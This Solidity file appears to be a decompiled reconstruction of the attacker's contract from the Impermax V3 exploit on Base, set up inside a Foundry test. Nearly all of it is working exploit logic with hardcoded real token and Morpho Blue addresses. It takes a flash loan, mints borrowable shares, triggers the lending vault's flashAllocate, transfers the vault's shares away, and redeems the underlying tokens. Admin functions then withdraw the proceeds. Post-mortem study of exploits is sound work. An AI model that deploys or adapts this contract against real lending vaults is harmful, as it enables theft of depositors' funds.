// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

/**
 * @title Impermax V3 Attacker Contract (Decompiled & Reconstructed)
 * @notice This is a human-readable reconstruction of the attacker's contract
 */

interface IMorphoBlueFlashLoan {
    function flashLoan(
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IImpermaxBorrowable {
    function underlying() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalBalance() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function exchangeRate() external returns (uint256);
    function mint(address minter) external returns (uint256);
    function redeem(address redeemer) external returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IImpermaxCollateral {
    function underlying() external view returns (address);
    function collateral() external view returns (address);
}

interface IImpermaxLendingVault {
    function getBorrowablesLength() external view returns (uint256);
    function borrowables(uint256 index) external view returns (address);
    function flashAllocate(
        address borrowable,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH {
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ImpermaxV3Attacker is Test {
    // Storage
    mapping(address => bool) public admins; // STORAGE[0x0]
    bool private initialized; // STORAGE[0x1]
    address public weth; // STORAGE[0x1] bytes 1-20
    address public wbtc; // STORAGE[0x2]
    address public usdt; // STORAGE[0x3]
    address public usdc; // STORAGE[0x4]
    address public dai; // STORAGE[0x5]
    address public cbBTC; // STORAGE[0x6]
    address public uniswapRouter; // STORAGE[0x9]
    address public morphoBlue; // STORAGE[0xa]

    address[] public exploitedBorrowables; // STORAGE[0xc]
    mapping(address => bool) public isExploited; // STORAGE[0xd]
    mapping(address => address) public poolFeeMapping; // STORAGE[0xe]

    struct AttackParams {
        address lendingVault; // word0
        address token1; // word1
        address token2; // word2
        address targetBorrowable; // word3
        address underlyingToken; // word4
        address collateral; // word5
        address uniswapPair; // word6
        address pairedToken; // word7
        address otherBorrowable; // word8
        address pairToken0; // word9
        address pairToken1; // word10
        address router; // word11
        address vault; // word12
        uint256 flashLoanAmount; // word13
        uint256 iterationCount; // word14
        bool shouldExploit; // word15
    }

    struct BorrowableInfo {
        address borrowable;
        uint256 targetAmount;
        uint256 additionalAmount;
    }

    receive() external payable {}

    // ============================================
    // MAIN ATTACK ENTRY POINT
    // ============================================

    /**
     * @notice Main attack function triggered by Morpho Blue flash loan callback
     * @param amount Flash loan amount
     * @param data Encoded AttackParams + BorrowableInfo[]
     */
    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == morphoBlue, "Only Morpho");

        // Decode attack parameters
        AttackParams memory params;
        BorrowableInfo[] memory borrowables;

        (params, borrowables) = abi.decode(
            data,
            (AttackParams, BorrowableInfo[])
        );

        // Get underlying token
        address underlyingToken = IImpermaxBorrowable(params.otherBorrowable)
            .underlying();

        // ============================================
        // PHASE 1: Mint borrowable tokens
        // ============================================
        console.log("=== Phase 1: Minting Borrowable Tokens ===");

        for (uint i = 0; i < borrowables.length; i++) {
            if (borrowables[i].targetAmount == 0) continue;

            address borrowable = borrowables[i].borrowable;
            uint256 transferAmount = borrowables[i].targetAmount;

            // Transfer underlying tokens to borrowable
            IERC20(underlyingToken).transfer(borrowable, transferAmount);

            // Mint borrowable tokens
            uint256 minted = IImpermaxBorrowable(borrowable).mint(
                address(this)
            );

            console.log("--- shares:", borrowable, minted);
        }

        // ============================================
        // PHASE 2: FlashAllocate from Vault
        // ============================================
        console.log("=== Phase 2: FlashAllocate ===");

        uint256 allocateAmount = (amount * 999) / 1000; // 99.9% of flash loan

        IImpermaxLendingVault(params.lendingVault).flashAllocate(
            params.otherBorrowable,
            allocateAmount,
            ""
        );

        // Log balances
        uint256 poolBalance = IERC20(params.otherBorrowable).balanceOf(
            underlyingToken
        );
        uint256 vaultBalance = IERC20(params.otherBorrowable).balanceOf(
            params.lendingVault
        );
        uint256 thisBalance = IERC20(params.otherBorrowable).balanceOf(
            address(this)
        );
        uint256 underlyingBalance = IERC20(underlyingToken).balanceOf(
            address(this)
        );

        console.log("pool balance:", poolBalance);
        console.log("vault balance:", vaultBalance);
        console.log("this balance:", thisBalance);
        console.log("this token balance 1:", underlyingBalance);

        // ============================================
        // PHASE 3: Transfer vault's borrowable tokens
        // ============================================
        console.log("=== Phase 3: Stealing Vault Shares ===");

        // Get vault's borrowable balance after flashAllocate
        uint256 vaultShares = IImpermaxBorrowable(params.otherBorrowable)
            .balanceOf(params.vault);

        // Force transfer from vault to borrowable contract
        IImpermaxBorrowable(params.otherBorrowable).transferFrom(
            params.vault,
            params.otherBorrowable,
            vaultShares
        );

        // ============================================
        // PHASE 4: Redeem to extract underlying tokens
        // ============================================
        console.log("=== Phase 4: Redeeming ===");

        IImpermaxBorrowable(params.otherBorrowable).redeem(address(this));

        // Log final balances
        for (uint i = 0; i < borrowables.length; i++) {
            if (borrowables[i].targetAmount == 0) continue;

            uint256 finalBalance = IERC20(underlyingToken).balanceOf(
                borrowables[i].borrowable
            );
            console.log(
                "--- balance:",
                borrowables[i].borrowable,
                finalBalance
            );
        }

        uint256 finalUnderlyingBalance = IERC20(underlyingToken).balanceOf(
            address(this)
        );
        console.log("this token balance 2:", finalUnderlyingBalance);
    }

    // ============================================
    // HELPER: Redeem from specific borrowable
    // ============================================

    function redeemFromBorrowable(
        address borrowable,
        address underlyingToken
    ) external {
        require(msg.sender == address(this), "onlyThis");

        // Get pool's underlying balance
        uint256 poolUnderlyingBalance = IERC20(underlyingToken).balanceOf(
            borrowable
        );

        // Calculate required shares (with upscaling)
        uint256 requiredShares = (poolUnderlyingBalance * 1e18) /
            IImpermaxBorrowable(borrowable).exchangeRate();

        uint256 ourShares = IImpermaxBorrowable(borrowable).balanceOf(
            address(this)
        );

        uint256 sharesToRedeem;
        if (ourShares <= requiredShares) {
            sharesToRedeem = ourShares;
        } else {
            sharesToRedeem = requiredShares;
        }

        // Transfer shares to borrowable contract
        IImpermaxBorrowable(borrowable).transfer(borrowable, sharesToRedeem);

        // Redeem
        IImpermaxBorrowable(borrowable).redeem(address(this));
    }

    // ============================================
    // MAIN EXPLOIT ORCHESTRATION
    // ============================================

    /**
     * @notice Execute full exploit with multiple borrowable pools
     */
    function executeExploit(bytes calldata attackData) external {
        require(admins[tx.origin] || admins[msg.sender], "Only admin");

        AttackParams memory params;
        params = abi.decode(attackData, (AttackParams));

        // Build borrowable list from vault
        IImpermaxLendingVault vault = IImpermaxLendingVault(
            params.lendingVault
        );
        uint256 borrowableCount = vault.getBorrowablesLength();

        BorrowableInfo[] memory borrowables = new BorrowableInfo[](
            borrowableCount
        );

        uint256 totalAmount = 0;

        for (uint i = 0; i < borrowableCount; i++) {
            address borrowable = vault.borrowables(i);

            // Skip the main target borrowable
            if (borrowable == params.otherBorrowable) {
                borrowables[i].borrowable = borrowable;
                borrowables[i].targetAmount = 0;
                borrowables[i].additionalAmount = 0;
                continue;
            }

            // Calculate amounts for this borrowable
            uint256 vaultBalance = IImpermaxBorrowable(borrowable).balanceOf(
                params.lendingVault
            );

            if (vaultBalance == 0) {
                borrowables[i].borrowable = borrowable;
                borrowables[i].targetAmount = 0;
                borrowables[i].additionalAmount = 0;
                continue;
            }

            uint256 exchangeRate = IImpermaxBorrowable(borrowable)
                .exchangeRate();
            uint256 targetAmount = (vaultBalance * exchangeRate) / 1e18;

            uint256 poolBalance = IERC20(
                IImpermaxBorrowable(borrowable).underlying()
            ).balanceOf(borrowable);

            uint256 additionalAmount;
            if (targetAmount >= poolBalance) {
                // Need more than what's in pool
                additionalAmount = (targetAmount - poolBalance) + 100;
            } else {
                additionalAmount = 0;
            }

            borrowables[i].borrowable = borrowable;
            borrowables[i].targetAmount = targetAmount;
            borrowables[i].additionalAmount = additionalAmount;

            totalAmount += targetAmount + additionalAmount;

            // Track exploited borrowable
            if (!isExploited[borrowable]) {
                exploitedBorrowables.push(borrowable);
                isExploited[borrowable] = true;
            }
        }

        // Approve Morpho Blue
        address underlyingToken = IImpermaxBorrowable(params.otherBorrowable)
            .underlying();
        IERC20(underlyingToken).approve(morphoBlue, totalAmount);

        // Execute flash loan
        bytes memory flashData = abi.encode(params, borrowables);
        IMorphoBlueFlashLoan(morphoBlue).flashLoan(
            underlyingToken,
            totalAmount,
            flashData
        );

        // Log final balances
        console.log(
            "pool balance:",
            IERC20(params.otherBorrowable).balanceOf(underlyingToken)
        );
        console.log(
            "vault balance:",
            IERC20(params.otherBorrowable).balanceOf(params.lendingVault)
        );
        console.log(
            "this balance:",
            IERC20(params.otherBorrowable).balanceOf(address(this))
        );
        console.log(
            "this token balance:",
            IERC20(underlyingToken).balanceOf(address(this))
        );

        console.log(
            "totalSupply:",
            IImpermaxBorrowable(params.otherBorrowable).totalSupply()
        );
        console.log(
            "totalBalance:",
            IImpermaxBorrowable(params.otherBorrowable).totalBalance()
        );
    }

    // ============================================
    // CALLBACK FOR VAULT'S FLASHALLOCATE
    // ============================================

    function lendingVaultAllocate(
        address borrowable,
        uint256 amount,
        bytes calldata data
    ) external {
        // Empty callback - vault will deposit funds into borrowable
    }

    // ============================================
    // ADMIN FUNCTIONS
    // ============================================

    function initialize() external {
        require(!initialized, "Already initialized");
        admins[msg.sender] = true;
        initialized = true;

        // Set token addresses based on chain
        if (block.chainid == 8453) {
            // Base
            usdt = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;
            usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
            dai = 0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb;
            weth = 0x4200000000000000000000000000000000000006;
            wbtc = 0x0555E30da8f98308EdB960aa94C0Db47230d2B9c;
            cbBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
            morphoBlue = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
        }
        // Add other chains as needed
    }

    function addAdmin(address admin) external {
        require(admins[msg.sender], "Only admin");
        admins[admin] = true;
    }

    function withdrawTokens(
        address[] calldata tokens,
        address recipient
    ) external {
        require(admins[msg.sender], "Only admin");
        require(recipient != address(0), "Invalid recipient");

        for (uint i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) {
                // Withdraw ETH
                uint256 balance = address(this).balance;
                if (balance > 0) {
                    (bool success, ) = recipient.call{value: balance}("");
                    require(success, "ETH transfer failed");
                }
            } else {
                // Withdraw ERC20
                uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
                if (balance > 0) {
                    IERC20(tokens[i]).transfer(recipient, balance);
                }
            }
        }

        // Withdraw WETH if exists
        uint256 wethBalance = IWETH(weth).balanceOf(address(this));
        if (wethBalance > 0) {
            IWETH(weth).withdraw(wethBalance);
        }

        // Send final ETH balance
        if (address(this).balance > 0) {
            (bool success, ) = recipient.call{value: address(this).balance}("");
            require(success);
        }
    }
}
